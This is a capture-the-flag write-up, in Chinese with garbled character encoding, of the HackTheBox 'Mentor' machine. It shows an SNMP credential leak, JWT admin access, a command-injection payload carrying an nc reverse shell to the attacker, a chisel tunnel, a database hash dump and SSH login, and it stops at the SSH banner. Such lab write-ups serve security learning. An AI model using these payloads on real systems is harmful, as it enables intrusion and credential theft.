<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vSdK24C80TAzdRH0OQCGIw)

title: HTB-Mentor

top: false

toc: true

mathjax: false

date: 2023-03-12 14:04:00

author: wa0er

img: /medias/article_cover/Mentor.png

password:

summary: HackTheBox-Mentor

keywords: HackTheBox

tags: HackTheBoxâ€â€

ä¿¡æ¯æ”¶é›†
----

nmap

```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -sC -sV -oA nmap/result 10.10.11.193
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-05 19:47 EST
Nmap scan report for 10.10.11.193
Host is up (0.38s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.40 seconds

```

å¼€æ”¾ç«¯å£ï¼š22ï¼ˆSSHï¼‰ã€80ï¼ˆHTTPï¼‰ï¼ŒåŸŸå`http://mentorquotes.htb/`

æ·»åŠ åŸŸååˆ°æœ¬åœ° hosts æ–‡ä»¶

```
echo "10.10.11.193  mentorquotes.htb" >> /etc/hosts

```

URL è®¿é—®`http://mentorquotes.htb/`

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShPciaLyZXibb8CDxvHoMbgO0Y1RibNQHNWEBZib21Rcz591tyMVInhOcIwA/640?wx_fmt=png)

wfuzz ä¸€ä¸‹å­åŸŸ

```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# wfuzz -H "Host: FUZZ.mentorquotes.htb" --hc 302,400 -t 50 -H "User-Agent: wa0er" -c -z file,"/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt" http://mentorquotes.htb/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://mentorquotes.htb/
Total requests: 38267
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                              
=====================================================================
000000142:   404        0 L      2 W        22 Ch       "api"                                                
Total time: 0
Processed Requests: 38267
Filtered Requests: 38266
Requests/sec.: 0

```

å¾— api å­åŸŸï¼Œå°† api å­åŸŸæ·»åŠ è¿›æœ¬åœ° hosts æ–‡ä»¶

```
echo "10.10.11.193  api.mentorquotes.htb" >> /etc/hosts

```

è®¿é—®`api.mentorquotes.htb`ï¼Œæ˜¯ 404

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShib1Z4eqLutsWpXo1UxaHKOQXnIM606TDiaX02ZDOZdWUVD8rKteKYWWg/640?wx_fmt=png)

ffuf çˆ†ç ´ä¸€ä¸‹`api.mentorquotes.htb`çš„ç›®å½•

```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://api.mentorquotes.htb/FUZZ -t 50
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
       v2.0.0-dev
________________________________________________
 :: Method           : GET
 :: URL              : http://api.mentorquotes.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________
[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 292ms]
    * FUZZ: admin
[Status: 200, Size: 969, Words: 194, Lines: 31, Duration: 533ms]
    * FUZZ: docs
[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 362ms]
    * FUZZ: users
[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 1082ms]
    * FUZZ: quotes
[Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 863ms]
    * FUZZ: server-status
:: Progress: [38267/38267] :: Job [1/1] :: 125 req/sec :: Duration: [0:04:47] :: Errors: 0 ::

```

å¾—åˆ°`api.mentorquotes.htb`å››ä¸ªç›®å½•ï¼š`/admin`ã€`/docs`ã€`/users`ã€`/quotes`ã€`/server-status`

`api.mentorquotes.htb/admin`å¦‚ä¸‹

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShoCm1x8FsXadqqylVBaD0TPmSIAXJhgG0ubI0vC4NFSD4ZicicyY4LjnA/640?wx_fmt=png)

`api.mentorquotes.htb/docs`å¦‚ä¸‹ï¼Œç”¨çš„ Swagger UIï¼Œé¡µé¢èƒ½çœ‹åˆ°å¾ˆå¤š API

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShHrH8YsMLKdkEdibpgGVaeZdRWbUUtKOTMjwE6C7yurRxog63ZwaEPVg/640?wx_fmt=png)

å¯ä»¥çœ‹åˆ°è¿™ä¸ªç«™ç‚¹çš„ç«™ä¸»æ˜¯ jamesï¼Œå¹¶ä¸”ä»–çš„é‚®ç®±æ˜¯`james@mentorquotes.htb`

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShiaTaLliaia1Hqdf052mfgicpuNQvGkmZrXwtMQgSyr7LjwEnyBe9ibx4Viag/640?wx_fmt=png)

åœ¨`/auth/signup`å°è¯•æ³¨å†Œè´¦æˆ·ï¼Œå¦‚ä¸‹ç•Œé¢ï¼Œå¡«å†™ emailã€usernameã€passwordï¼Œç‚¹å‡» Executeï¼ŒåŒæ—¶ Burp æŠ“åŒ…

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShDbb7xHz7OJyrs8ib1HTnZibURN9qITHlJ6I2D7XtkLSicF1bmgdAXK2YA/640?wx_fmt=png)

Burp æŠ“åŒ…é‡æ”¾ï¼Œå¦‚ä¸‹ï¼Œå¯çœ‹åˆ°è´¦æˆ·å·²è¢«åˆ›å»º

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMSh796ZNrDnibsrSH00flreqdroLxNrYgfGmrna9yA4Jdtib6Yrbox2bhmg/640?wx_fmt=png)

å°è¯•ç”¨åˆšåˆ›å»ºçš„è´¦æˆ·åœ¨`/auth/login`ç™»å½•ï¼Œå¡«å†™ emailã€usernameã€passwordï¼Œç‚¹å‡» Executeï¼Œä¾ç„¶ Burp æŠ“åŒ…

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShSicUFbia9KrLltJGZPqvYdKQFIlrGOYaLoLKZic74vx4Gn70lx5rUQ89A/640?wx_fmt=png)

Burp é‡æ”¾ï¼Œå‘ç°è¿”å›äº†ä¸€ä¸² JWTï¼ˆJsonWebTokenï¼Œä¸‹ç®€ç§° JWTï¼ŒJWT å…¸å‹çš„ä¸‰æ®µç»“æ„ï¼šxxx.xxx.xxxï¼‰

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShU2D1KObFF4GKXMo56EuSYEZAsbgDYxTkibTXe90iahPsTVT2eMws4SBA/640?wx_fmt=png)

```
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoid2EwZXJAZXhhbXBsZS5jb20ifQ.HfrTNgZInwCjDjfhO447ojuw5lEZWi03NmrENknZJZ8"

```

`/users`ç›®å½•åº”è¯¥æ˜¯æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯ï¼Œäºæ˜¯åœ¨`/users`ç›®å½•å°è¯•ç™»å½•ï¼Œå¦‚æœç›´æ¥ç™»å½•ï¼Œä¼šå‘ç°æç¤ºéœ€è¦ Authorization å­—æ®µï¼Œé‚£æˆ‘ä»¬å°±æŠ“åŒ…åœ¨è¯·æ±‚å¤´æ·»åŠ å¦‚ä¸‹ Authorization é”®å€¼å¯¹ï¼Œé‡æ”¾ HTTP è¯·æ±‚ï¼Œå‘ç°æç¤ºåªå…è®¸ admin ç”¨æˆ·è®¿é—®

```
Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoid2EwZXJAZXhhbXBsZS5jb20ifQ.HfrTNgZInwCjDjfhO447ojuw5lEZWi03NmrENknZJZ8

```

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShwAtv8Vr0C42LibSJ0HnLTlZHWufL1IstOjYdH0UvOfbAkk0QicCpoCeg/640?wx_fmt=png)

ç„¶åå°è¯•ç”¨ james ç”¨æˆ·çš„é‚®ç®±ç”¨æˆ·åå»æ³¨å†Œï¼Œå‘ç°ä¼šæç¤ºç”¨æˆ·å·²å­˜åœ¨

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShBmOrpXRzJCkm4hdQmiaZUrFoOxpGXcS4kqFV7ht7BOPGvXkZSfXSLaQ/640?wx_fmt=png)

éšåè¿›è¡Œç™¾èˆ¬å°è¯•ï¼Œå‘ç°å®ƒéªŒè¯ç”¨æˆ·æ˜¯å¦å·²å­˜åœ¨çš„é€»è¾‘æ˜¯ï¼šå½“ email å’Œ username åŒæ—¶åŒ¹é…åˆ°ç›¸åŒçš„å€¼æ—¶ï¼Œæ‰ä¼šè®¤å®šæ­¤ç”¨æˆ·å·²å­˜åœ¨ã€‚äºæ˜¯å°è¯•ä¼ªé€ ç®¡ç†å‘˜ç”¨æˆ·è·å–ç®¡ç†å‘˜ JWTï¼ˆè¿™é‡Œçš„ç®¡ç†å‘˜ç”¨æˆ·æ¨æµ‹åº”è¯¥æ˜¯ç«™ä¸» james æˆ–è€… adminï¼‰ã€‚

ä½†éšåç”¨`æ³¨å†Œâ†’ç™»å½•ï¼ˆè·å–JWTï¼‰â†’/usersç›®å½•`å°è¯•äº†ä»¥ä¸‹ 5 ç§ç»„åˆï¼Œå‡æç¤ºåªæœ‰ admin ç”¨æˆ·èƒ½è®¿é—®è¯¥èµ„æº

```
{
    "email":"james@mentorquotes.htb",
    "username":"wa0er",
    "password":"wa0erwa0er"
}

```

```
{
    "email":"wa0er@mentorquotes.htb",
    "username":"james",
    "password":"wa0erwa0er"
}

```

```
{
    "email":"admin@mentorquotes.htb",
    "username":"admin",
    "password":"wa0erwa0er"
}

```

```
{
    "email":"admin@mentorquotes.htb",
    "username":"wa0er",
    "password":"wa0erwa0er"
}

```

```
{
    "email":"wa0er@mentorquotes.htb",
    "username":"admin",
    "password":"wa0erwa0er"
}

```

éšåæ•´ç†æ€è·¯ï¼Œåœ¨ä¸€æ¬¡ nmap æ‰«æä¸­ï¼Œçœ‹åˆ°å¦‚ä¸‹ä¿¡æ¯

```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -sU 10.10.11.193
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-11 21:40 EST
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open|filtered snmp
Nmap done: 1 IP address (1 host up) scanned in 1031.83 seconds

```

68 ç«¯å£ï¼ˆDHCPCï¼‰å’Œ 161 ç«¯å£ï¼ˆSNMPï¼‰å¼€æ”¾ï¼ŒDHCP å¯èƒ½çš„æ”»å‡»ä¸»è¦å°±æ˜¯æ‹’ç»æœåŠ¡å’Œä¸­é—´äººæ”»å‡»ï¼Œç”¨ä¸ä¸Šï¼Œé‚£å°±ä» SNMP ä¸‹æ‰‹ã€‚

SNMP å…¨ç§°ç®€å•ç½‘ç»œç®¡ç†åè®®ï¼Œæ˜¯ä¸“é—¨è®¾è®¡ç”¨äºåœ¨ IP ç½‘ç»œç®¡ç†ç½‘ç»œèŠ‚ç‚¹ï¼ˆæœåŠ¡å™¨ã€å·¥ä½œç«™ã€è·¯ç”±å™¨ã€äº¤æ¢æœºåŠ HUBS ç­‰ï¼‰çš„ä¸€ç§æ ‡å‡†åè®®ï¼Œæ˜¯ä¸€ç§åº”ç”¨å±‚åè®®ã€‚é€šè¿‡ SNMP å¯ä»¥è®¿é—®è®¾å¤‡ä¿¡æ¯ã€æ”¹å†™å’Œé…ç½®è®¾å¤‡å‚æ•°ç­‰ï¼ŒSNMP è¿è¡Œåœ¨ UDP161 ç«¯å£ä¸Šï¼Œé‡‡ç”¨ UDP åè®®åœ¨ç®¡ç†ç«¯å’Œ agent ä¹‹é—´ä¼ è¾“ä¿¡æ¯ã€‚

è¯•è¯•ç”¨`snmpbulkwalk`è¯»å–ç›¸å…³é…ç½®ä¿¡æ¯

https://linux.die.net/man/1/snmpbulkwalk

```
snmpbulkwalk -c internal -v2c 10.10.11.193 > snmpbulk_mentor
æ³¨ï¼š
-v 1|2c|3  æŒ‡å®šSNMPç‰ˆæœ¬
-c COMMUNITY  æŒ‡å®šcommunity string
-m MIB[:...]  æŒ‡å®šMIBæ–‡ä»¶ï¼ˆæ­¤å¤„æ²¡ç”¨åˆ°ï¼‰

```

æŸ¥çœ‹åˆšè¯»å–çš„é…ç½®ä¿¡æ¯ï¼Œæœç´¢å¸¦æœ‰ login å­—ç¬¦ä¸²çš„æ¡ç›®ï¼Œå‘ç°`/usr/local/bin/login.py`æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²`kj23sadkj123as0-d213`ï¼Œå¯èƒ½æ˜¯ç®¡ç†å‘˜çš„ç™»å½•å¯†ç 

```
cat snmpbulk mentor | grep login

```

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShZVln9iaScJErKe3v822HnxBb35J4TfmclbJdOSibSxJ1TuoggtAA9jOA/640?wx_fmt=png)

æˆ‘ä»¬åˆ°`/auth/login`ç›®å½•ï¼Œç”¨ james çš„é‚®ç®±å’Œç”¨æˆ·åï¼Œå¯†ç å¡«å†™åˆšè·å¾—çš„å¯†ç ï¼ŒæˆåŠŸç™»å½•ï¼Œè·å–åˆ° james è´¦æˆ· JWT

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMSh27rQwJy6lrFZWcjB03lAGQCZicv3sOK4jFPdAMF7VW2iakQhgXAq2XQw/640?wx_fmt=png)

```
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0

```

å‘½ä»¤æ‰§è¡Œ
----

è®¿é—®`/users/`ç›®å½•ï¼ŒæˆåŠŸæ‹¿åˆ°ç”¨æˆ·åˆ—è¡¨ï¼Œä¸»è¦æ˜¯ä¸¤ä¸ªç”¨æˆ·ï¼šjames å’Œ service_acc

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShWMWZdLm2GhKEic3z2yficNyKLIib0urCGibsZibArAUeNFtJrDdHb2qaEPg/640?wx_fmt=png)

åˆšæ‰æˆ‘ä»¬çˆ†ç ´å‡ºäº†`/admin`ç›®å½•ï¼Œæˆ‘ä»¬é‡æ–°ç”¨è¿™ä¸ª JWT è®¿é—®æ­¤ç›®å½•ï¼Œå‘ç°æœ‰ä¸¤ä¸ªåŠŸèƒ½ç›®å½•

```
"admin_funcs":{
    "check db connection":"/check",
    "backup the application":"/backup"

```

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShTG0FkrdUXojxlI18WcDj0X0OmhxzgvtkA3IBkSheoGXH0HUGeAxyibA/640?wx_fmt=png)

è®¿é—®`/admin/check`ï¼Œè¿”å›`Not implemented yet!`

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShFRRTnoCPTDTia9xZKNkJQMuDFibTJialuzia3yZhTZQeUlpvdzmOMQPj7Q/640?wx_fmt=png)

è®¿é—®`/admin/backup`ï¼Œè¿”å›`Method Not Allowed`

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShpeibdibDSz2JQnLA259oWTp3mhuHpibKZJ3PPEIf4BagDSibK0BWes9KQg/640?wx_fmt=png)

åœ¨è¯·æ±‚å¤´åŒºåŸŸå•å‡»é¼ æ ‡å³é”®ï¼Œé€‰æ‹©`Change request method`ï¼Œè‡ªåŠ¨åˆ‡æ¢æˆ POST æ–¹æ³•ï¼Œç‚¹å‡»`send`å‘é€æ•°æ®åŒ…åï¼Œ

å¯çœ‹åˆ°å“åº”åŒ…`content-type`å€¼ä¸º`application/json`ï¼Œå†åŠ ä¸Šæ•°æ®éƒ¨åˆ†çš„æŠ¥é”™ï¼Œæ„æ€å°±æ˜¯è¯·æ±‚åŒ…éœ€è¦æœ‰å¸¦ body å±æ€§çš„ json å¯¹è±¡

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShbtXQKelfXu6mdU8Hc90Bywv9RbYZ6BW56w4WdGsibrgEAaa7xiaic5p2Q/640?wx_fmt=png)

ä¿®æ”¹`content-type`å€¼ä¸º`application/json`ï¼Œè¯·æ±‚å¤´å†…å®¹æ·»åŠ  json å¯¹è±¡ï¼Œbody ä¸ºç©ºå°±è¡Œï¼Œåˆæç¤ºéœ€è¦ path å±æ€§

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShLe3srFV7FINRloH8js4Y86FlSolFMxGcXW7O8XopfawRTTic1uYEMBA/640?wx_fmt=png)

äºæ˜¯åœ¨è¯·æ±‚å¤´å†…å®¹æ·»åŠ  body å±æ€§å’Œ path å±æ€§ï¼Œè¿”å›`Done!`ï¼Œå—¯ï¼Ÿï¼Ÿï¼Ÿï¼ŒDone äº†ä¸ªå¯‚å¯ï¼Œåº”è¯¥æ˜¯ä»£å…¥æ‰§è¡Œäº†

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShYicvP2ssr9224tZRwc7ibBdiaabNfgo2u34rNFIIRUz9KVSHQuJERlx9A/640?wx_fmt=png)

é‚£æˆ‘ä»¬å°±å°è¯•æ‰§è¡Œå‘½ä»¤ï¼Œä¿®æ”¹ body å¦‚ä¸‹ï¼Œä¹Ÿå°±æ˜¯ ping æœ¬åœ°ä¸»æœºï¼ˆåŠ¡å¿…è®°å¾—æœ«å°¾åŠ åˆ†å·ï¼ï¼‰

åœ¨å‘é€è¯·æ±‚åŒ…å‰åœ¨æœ¬åœ°å¼€å¯ tcpdump æ•è·æ•°æ®åŒ…

```
tcpdump -i tun0 icmp   #åªæ•è·tun0ç½‘å¡çš„icmpåè®®æ•°æ®åŒ…

```

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMSh3QXticU5YEMm70cwXphXZl1AC1Y2ToKPEicWu6rQvV0PcW2DviaQWQickg/640?wx_fmt=png)

å‘é€è¯·æ±‚åŒ…åï¼Œå¯åœ¨æœ¬åœ°çœ‹åˆ°æœ‰æ•°æ®åŒ…è¢«æ•è·ï¼Œè¯´æ˜å‘½ä»¤è¢«æˆåŠŸæ‰§è¡Œ

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShJJ1N1aOgaJ8LVTzLt5ljC0zicviatmib4ELEzNLHmvt7S942pXFeiaJe1g/640?wx_fmt=png)

é‚£å°±æ„é€ å¦‚ä¸‹è¯·æ±‚åŒ…ï¼Œæœ¬åœ°å¼€å¯ nc ç›‘å¬

```
nc -nvlp 9898

```

```
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api.mentorquotes.htb/docs
Connection: close
Content-Type: application/json
Content-Length: 108
{
    "body": "wa0er",
    "path":"/;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.X.X 9898 >/tmp/f;"
}

```

æˆåŠŸåå¼¹ shellï¼Œè·å–åˆ° root æƒé™ï¼Œä½†çœ‹åˆ° nc æç¤º`sh: can't access tty; job control turned off`ï¼Œè¿™è¯´æ˜æ ¹æœ¬å°±æ²¡æœ‰è¿›åˆ°æ§åˆ¶ç»ˆç«¯ï¼Œå¯èƒ½æ˜¯ä¸ªè™šæ‹Ÿç¯å¢ƒä¹‹ç±»çš„ï¼Œå°è¯•è¯»å–`/root/root.txt`æ–‡ä»¶å‘ç°ç¡®å®æ²¡æœ‰ï¼Œæ‰€ä»¥è¿˜è¦è¿›ä¸€æ­¥ getshell

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShwt7uwhibgde6bEP0VJdZaJoRHatvOfPGELllubuZFfMibfXcfc7iciaxYw/640?wx_fmt=png)

`/app/app`ç›®å½•ä¸‹æœ‰`db.py`

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShsibxG8s93T8pu7lDBWFlVYvjUMqTJ7KwYUE9mgAgKxsLQm79XZ4MOqQ/640?wx_fmt=png)

`db.py`å†…å®¹å¦‚ä¸‹

```
import os
from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database
# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)
# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)
# Databases query builder
database = Database(DATABASE_URL)

```

ä¸ºäº†ä¸ PostgreSQL æ•°æ®åº“äº¤äº’ï¼Œéœ€è¦ç”¨åˆ°`chisel`å·¥å…·

chisel å·¥å…·ï¼šhttps://github.com/jpillora/chisel

ä»æœ¬åœ°ä¼ ä¸€ä¸ª chisel

```
æœ¬åœ°ï¼špython3 -m http.server 80
é¶æœºï¼šwget http://[æœ¬åœ°IP]/chisel

```

ï¼ˆPSï¼šè¿™é‡Œçœ‹åˆ°é¶æœº IP ä¸º 10.129.89.191ï¼Œä¸ä¹‹å‰çš„ 10.10.11.193 ä¸ä¸€è‡´ï¼Œæ˜¯å› ä¸ºé¶æœºä¸­é—´ç½‘ç»œä¸­æ–­ï¼Œæˆ‘åˆ‡æ¢è¿‡é¶æœºç¯å¢ƒï¼Œæœ¬è´¨ä¸Šä»–ä¿©éƒ½æ˜¯è¿™å°é¶æœºåœ°å€ï¼‰

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShjS75GPkXPvlT1Cx1kJElZbxXZOKYBNMMFC1zJ70Ib3Vl4iafxbLyWMw/640?wx_fmt=png)

å°† chisel å¤åˆ¶åˆ°`/tmp`æ–‡ä»¶å¤¹ä¸‹ï¼Œå¹¶æ·»åŠ å¯æ‰§è¡Œæƒé™

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShSoq0GawQEfH6uwtDtTq8Dtm6ibpawTlCvX1uia1FmuicDRoBtqY6FGibYw/640?wx_fmt=png)

æœ¬åœ°æ‰§è¡Œï¼š

```
chmod +x chisel
./chisel server --port 9899 --reverse

```

é¶æœºæ‰§è¡Œï¼š

```
chmod +x chisel
./chisel client -v 10.10.X.X:9899 R:5432:172.22.0.1:5432

```

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShj1VHDWGguAE0cs5icCVlj9rlOPLlhURnv0iaj1FtkLTY0ftcE1tonodg/640?wx_fmt=png)

è¿æ¥æ•°æ®åº“ï¼Œå¯†ç æ˜¯`postgres`

```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# psql -h 10.10.X.X -U "postgres" -p 5432
Password for user postgres: 
psql (13.2 (Debian 13.2-1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.
postgres=# \list
                                    List of databases
      Name       |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges   
-----------------+----------+----------+------------+------------+-----------------------
 mentorquotes_db | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 postgres        | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
 template1       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
(4 rows)
postgres=# \c mentorquotes_db 
psql (13.2 (Debian 13.2-1), server 13.7 (Debian 13.7-1.pgdg110+1))
You are now connected to database "mentorquotes_db" as user "postgres".
mentorquotes_db=# \d
              List of relations
 Schema |     Name      |   Type   |  Owner   
--------+---------------+----------+----------
 public | cmd_exec      | table    | postgres
 public | quotes        | table    | postgres
 public | quotes_id_seq | sequence | postgres
 public | users         | table    | postgres
 public | users_id_seq  | sequence | postgres
(5 rows)
mentorquotes_db=# select * from users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | wa0er@mentorquotes.htb | james       | ad4ece449e52f57769466a281720b825
  5 | james@mentorquotes.htb | wa0er       | ad4ece449e52f57769466a281720b825
  6 | admin@mentorquotes.htb | admin       | ad4ece449e52f57769466a281720b825
(5 rows)

```

è·å–åˆ°ç”¨æˆ·å¯†ç  hash å€¼ï¼Œåªæœ‰å‰ä¸¤ä¸ªæœ‰ç”¨ï¼Œåé¢çš„æ˜¯ä¹‹å‰è‡ªå·±æ·»åŠ çš„

ç ´è§£ä¸€ä¸‹ https://crackstation.net/

![](https://mmbiz.qpic.cn/mmbiz_png/HrnmBmtxBzt2v2eHqjBHy0AaQUbriaMShqVjJLqf03jhs8tiaibdvWmMYWaM3nTCZpdO2MsJFkuMibjxTOYUCUC8jA/640?wx_fmt=png)

å¾—åˆ° svc è´¦æˆ·çš„å¯†ç 

```
123meunomeeivani

```

ç™»å½• ssh

```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ssh svc@10.10.11.193
svc@10.10.11.193's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
  System information as of Thu Mar  9 09:03:14 AM UTC 2023
  System load:                      0.0
  Usage of /:                       65.3% of 8.09GB
  Memory usage:                     15%
  Swap usage:                       0%
  Processes:                        243
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
